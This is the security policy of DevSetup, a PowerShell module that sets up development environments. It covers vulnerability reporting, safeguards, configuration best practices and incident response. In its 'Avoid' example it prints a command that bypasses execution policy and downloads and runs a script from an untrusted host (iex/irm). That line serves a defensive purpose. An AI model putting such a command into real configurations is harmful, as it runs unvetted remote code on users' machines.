# Security Policy

## Overview

DevSetup is a PowerShell module that automates development environment setup by installing packages and executing commands. We take security seriously and have implemented multiple layers of protection to ensure safe usage.

## Supported Versions

We actively maintain and provide security updates for the following versions:

| Version | Supported          |
| ------- | ------------------ |
| 1.0.6+  | :white_check_mark: |
| < 1.0   | :x:                |

## Security Features

### Built-in Security Measures

#### 1. **Configuration Validation**
- All YAML configuration files are validated using `Assert-DevSetupEnvValid`
- Schema validation prevents malicious or malformed configurations
- Input sanitization for all user-provided parameters

#### 2. **WhatIf/Confirm Support**
- All destructive operations support `-WhatIf` parameter for safe testing
- Users can preview changes before execution using dry-run functionality
- Confirmation prompts for potentially dangerous operations

#### 3. **Secure Command Execution**
- Commands are executed in controlled contexts with proper error handling
- No arbitrary code execution from untrusted sources
- Parameter validation and sanitization for all external commands

#### 4. **Provider Security**
- Package installations use official package managers (Chocolatey, Scoop, PowerShell Gallery)
- Version pinning support to prevent supply chain attacks
- Verification of package sources and integrity

#### 5. **Logging and Auditing**
- Comprehensive logging of all operations via `Write-StatusMessage`
- Stack trace logging for debugging and security analysis
- Optional detailed logging with `Write-EZLog`

### Security Analysis

The project includes automated security analysis:

```powershell
# Run security analysis
.\runSecurity.ps1
```

This script performs:
- PowerShell Script Analyzer (PSScriptAnalyzer) security rule checks
- Code quality and security best practice validation
- Detection of common security anti-patterns

## Reporting Security Vulnerabilities

We appreciate the security research community's efforts to improve the security of our project. If you believe you have found a security vulnerability in DevSetup, please report it responsibly.

### Reporting Process

1. **Do not** create a public GitHub issue for security vulnerabilities
2. **Do** email security reports to: [security@pwshdevs.com](mailto:security@pwshdevs.com)
3. Include the following information:
   - Description of the vulnerability
   - Steps to reproduce the issue
   - Potential impact assessment
   - Suggested mitigation (if known)
   - Your contact information

### Response Timeline

- **Acknowledgment**: Within 48 hours of report receipt
- **Initial Assessment**: Within 5 business days
- **Status Updates**: Weekly until resolution
- **Resolution**: Target within 30 days for high-severity issues

### Disclosure Policy

- We follow responsible disclosure practices
- We will work with reporters to understand and address issues
- Public disclosure will be coordinated after fixes are available
- Credit will be given to reporters (if desired) in security advisories

## Security Best Practices for Users

### Safe Configuration Management

#### 1. **Source Control Security**
```yaml
# ✅ Good: Specific versions and trusted sources
dependencies:
  scoop:
    packages:
      - name: "git"
        version: "2.41.0"
        bucket: "main"

# ❌ Avoid: Unspecified versions or untrusted sources
dependencies:
  scoop:
    packages:
      - name: "git"  # No version specified
        bucket: "unknown-bucket"  # Untrusted source
```

#### 2. **Command Security**
```yaml
# ✅ Good: Specific, well-defined commands
commands:
  - packageName: "git-config"
    command: "git"
    params:
      config:
        - "--global user.name 'Your Name'"
        - "--global user.email 'you@example.com'"

# ❌ Avoid: Arbitrary or complex command chains
commands:
  - packageName: "dangerous"
    command: "powershell -ExecutionPolicy Bypass -Command 'iex (irm https://untrusted.com/script.ps1)'"
```

### Environment File Security

#### 1. **File Validation**
- Always validate environment files before use:
  ```powershell
  # Test configuration before installation
  devsetup -Install -Name "my-env" -DryRun
  ```

#### 2. **Source Verification**
- Only use environment files from trusted sources
- Review all commands and packages before execution
- Verify checksums when downloading from URLs

#### 3. **Access Control**
- Store environment files in secure locations
- Use appropriate file permissions
- Avoid storing secrets in plain text

### Network Security

#### 1. **HTTPS Usage**
- Always use HTTPS URLs for remote environment files
- Verify SSL certificates are valid
- Use trusted mirror sources for packages

#### 2. **Firewall Considerations**
- Package managers may require internet access
- Consider corporate proxy configurations
- Monitor network traffic during installations

### Execution Environment

#### 1. **Privilege Management**
- Run with minimum required privileges
- Avoid unnecessary administrative rights
- Use PowerShell execution policy appropriately

#### 2. **Isolation**
- Test in isolated environments when possible
- Use containers or VMs for untrusted configurations
- Maintain separate environments for different projects

## Common Security Scenarios

### Scenario 1: Untrusted Environment File
**Risk**: Malicious commands or packages in configuration
**Mitigation**:
```powershell
# Always review and test first
Get-Content "untrusted.devsetup" | Out-Host
devsetup -Install -Path "untrusted.devsetup" -DryRun
```

### Scenario 2: Supply Chain Attack
**Risk**: Compromised packages from official repositories
**Mitigation**:
- Pin specific package versions
- Monitor security advisories for used packages
- Use package verification when available

### Scenario 3: Command Injection
**Risk**: Malicious commands in YAML configuration
**Mitigation**:
- DevSetup validates all inputs through schema validation
- Commands are executed in controlled contexts
- No shell interpretation of user input

### Scenario 4: Privilege Escalation
**Risk**: Unnecessary elevation of privileges
**Mitigation**:
- Most operations don't require administrative privileges
- Package managers handle elevation appropriately
- Use `-DryRun` to preview required permissions

## Security Checklist for Contributors

When contributing to DevSetup, please ensure:

- [ ] **Input Validation**: All user inputs are properly validated
- [ ] **Error Handling**: Comprehensive try/catch blocks with secure error messages
- [ ] **Logging**: Appropriate logging without exposing sensitive information
- [ ] **Testing**: Security scenarios are included in test suites
- [ ] **Documentation**: Security implications are documented
- [ ] **Dependencies**: New dependencies are from trusted sources
- [ ] **Permissions**: Minimal required permissions are used
- [ ] **WhatIf Support**: Destructive operations support dry-run mode

## Security Testing

### Automated Testing
The project includes security-focused tests:
```powershell
# Run tests with security focus
Invoke-Pester -Path "DevSetup\**\*.Tests.ps1" -Tag "Security"

# Test error handling and edge cases
Invoke-Pester -Path "DevSetup\**\*.Tests.ps1" -Tag "ErrorHandling"
```

### Manual Security Testing
1. **Configuration Validation**:
   - Test with malformed YAML files
   - Verify handling of missing/invalid properties
   - Check parameter validation

2. **Command Execution**:
   - Test with invalid commands
   - Verify proper error handling
   - Check for information disclosure

3. **File Operations**:
   - Test with non-existent paths
   - Verify access control respect
   - Check for path traversal issues

## Incident Response

If you believe your system has been compromised through the use of DevSetup:

1. **Immediate Actions**:
   - Isolate the affected system
   - Document the incident details
   - Preserve logs and evidence

2. **Assessment**:
   - Review recent DevSetup usage
   - Check installed packages and executed commands
   - Analyze system logs for anomalies

3. **Recovery**:
   - Remove or quarantine suspicious packages
   - Reset affected configurations
   - Update to the latest DevSetup version

4. **Reporting**:
   - Report the incident to the DevSetup team
   - Share lessons learned with the community (if appropriate)

## Resources

### Security Tools
- [PowerShell Script Analyzer](https://github.com/PowerShell/PSScriptAnalyzer) - Static analysis tool
- [Chocolatey Security](https://docs.chocolatey.org/en-us/features/security) - Package security features
- [Scoop Security](https://github.com/ScoopInstaller/Scoop/wiki/Security) - Scoop security documentation

### Security Guidelines
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/learn/security/powershell-security-best-practices)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Web application security risks
- [CIS Controls](https://www.cisecurity.org/controls/) - Cybersecurity framework

### Community Resources
- [PowerShell Security Forum](https://github.com/PowerShell/PowerShell/discussions/categories/security)
- [DevSec Community](https://dev-sec.io/) - DevOps security resources

## Contact Information

- **Security Issues**: [security@pwshdevs.com](mailto:security@pwshdevs.com)
- **General Questions**: [GitHub Discussions](https://github.com/pwshdevs/devsetup/discussions)
- **Documentation**: [Project Website](https://www.pwshdevs.com/docs/devsetup/)

---

**Note**: This security policy is a living document and will be updated as the project evolves. Please check back regularly for updates.

Last Updated: September 2025